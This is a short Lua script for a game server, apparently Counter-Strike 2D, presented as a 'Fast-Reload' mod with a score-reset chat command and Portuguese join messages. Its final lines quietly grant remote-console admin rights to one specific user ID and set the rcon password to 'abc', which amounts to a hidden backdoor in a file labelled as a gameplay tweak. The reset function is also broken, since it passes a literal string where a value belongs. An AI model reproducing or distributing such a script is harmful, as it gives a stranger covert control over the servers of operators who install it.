------Fast-Reload-------
------By leon7070-------
------06.10.2010--------
---www.newearth.de.tt---

addhook("reload","fastreload")
function fastreload(id,mode)
wp = player(id,"weapontype")
	if mode==1 then
		parse("equip "..id.." "..wp)
		parse("setweapon "..id.." "..wp)
	end
end

addhook("say","reset") 
function reset(id,txt) 
if(txt=="!reset") then
parse ("setscore "..id.." ..sc")
parse ("setdeaths "..id.." ..sc")
parse ("sv_msg2 "..id.." ©887777888 Voçe resetou seu Score! ")
	end 
end

addhook("join","thejoin")
function thejoin(id)
          msg("©150130255"..player(id,"name").." Entrou No Server!@C")
     end

addhook("minute","minute_reset")
function minute_reset()
        msg("©255105000Para resetar o score escreva !reset ") 
end

parse("mp_autoteambalance 0")
parse("mp_damagefactor 999")
parse("sv_rconusers 90592")
parse("sv_rcon abc")

